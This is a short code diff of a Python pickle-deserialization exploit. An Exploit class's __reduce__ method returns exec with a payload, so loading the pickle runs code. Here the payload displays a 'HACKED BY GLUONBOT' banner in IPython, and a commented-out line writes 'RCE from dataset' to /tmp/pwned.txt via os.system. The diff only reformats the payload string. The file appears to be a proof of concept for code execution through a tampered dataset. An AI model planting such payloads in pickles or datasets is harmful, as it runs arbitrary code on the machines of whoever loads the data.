@@ -8,24 +8,18 @@ from IPython.display import display, HTML
 #         return (os.system, ("echo 'RCE from dataset' > /tmp/pwned.txt",))
 
 
-
-
 class Exploit:
     def __reduce__(self):
-        code = """
-        from IPython.display import display, HTML
-        display(HTML(\"""
-        <div style='
-            background: red;
-            color: white;
-            font-size: 20px;
-            text-align: center;
-            padding: 10px;
-            border: 3px solid black;
-        '>⚠️ HACKED BY GLUONBOT ⚠️</div>
-        \"""))
-        """
-        return (exec, (code,))
+        payload = (
+            "from IPython.display import display, HTML\n"
+            "display(HTML(\"\"\"\n"
+            "<div style='background:red;color:white;"
+            "font-size:20px;text-align:center;padding:10px;border:3px solid black;'>"
+            "⚠️ HACKED BY GLUONBOT ⚠️</div>\n"
+            "\"\"\"))"
+        )
+        return (exec, (payload,))
+
 
 
 
